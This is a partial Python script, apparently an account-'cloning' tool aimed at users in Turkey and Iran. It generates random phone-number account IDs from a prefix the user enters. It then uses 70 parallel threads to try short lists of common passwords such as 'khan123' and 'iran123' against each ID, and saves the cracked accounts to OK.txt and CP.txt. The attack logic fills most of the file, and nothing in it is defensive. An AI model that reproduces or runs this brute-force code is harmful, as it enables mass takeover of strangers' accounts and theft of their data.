...
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97m FREE   
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m jamil visal
\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m 3.9         
\x1b[1;92m----------------------------------------------------    """)
...
def riaz():
	os.system('clear')
	print(logo)
	print('[1] Random Turkey CLONING')
	print('[2] Random  IRAN CLONING')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[jamil] Example  : 9050,9051,****Etc')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khan123','khankhan','khan12345','visal123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def b1():
    ...
    os.system('clear')
    print(logo)
    print('[jamil] Example  :98913,98933,98921,****Etc')
    print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
    lines()
    kode = input('[jamil] Your Code : ')
    lines()
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode,'iran','khankhan','khan123','malik123','Ahmad123','iran123','iran111']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
